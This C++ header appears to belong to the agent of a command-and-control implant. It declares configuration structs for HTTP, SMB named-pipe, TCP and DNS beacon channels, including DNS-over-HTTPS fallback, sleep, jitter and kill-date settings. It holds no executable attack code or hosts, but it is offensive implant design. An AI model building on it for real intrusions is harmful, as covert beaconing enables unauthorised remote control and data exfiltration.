#pragma once

#include <windows.h>

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT
typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	BYTE*  uri;
	BYTE*  parameter;
	BYTE*  user_agent;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;

// DNS mode constants
#define DNS_MODE_UDP           0  // Only UDP DNS
#define DNS_MODE_DOH           1  // Only DoH (DNS over HTTPS)
#define DNS_MODE_UDP_FALLBACK  2  // UDP first, fallback to DoH on failure
#define DNS_MODE_DOH_FALLBACK  3  // DoH first, fallback to UDP on failure

typedef struct {
	BYTE* domain;
	BYTE* resolvers;        // UDP DNS resolvers (IP addresses, comma-separated)
	BYTE* doh_resolvers;    // DoH resolver URLs (comma-separated)
	BYTE* qtype;       
	ULONG pkt_size;     
	ULONG label_size;   
	ULONG ttl;          
	BYTE* encrypt_key;  
	ULONG burst_enabled;
	ULONG burst_sleep;
	ULONG burst_jitter;
	ULONG dns_mode;         // DNS_MODE_* constant
} ProfileDNS;

#endif



class AgentConfig
{
public:
	BOOL active;

	ULONG agent_type;
	ULONG listener_type;
	BYTE* encrypt_key;
	ULONG sleep_delay;
	ULONG jitter_delay;
	ULONG kill_date;
	ULONG working_time;

	BYTE  exit_method;
	ULONG exit_task_id;
	ULONG download_chunk_size;

#if defined(BEACON_HTTP)
	ProfileHTTP profile;

#elif defined(BEACON_SMB)
	ProfileSMB profile;

#elif defined(BEACON_TCP)
	ProfileTCP profile;

#elif defined(BEACON_DNS)
	ProfileDNS profile;

#endif

	AgentConfig();

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;
};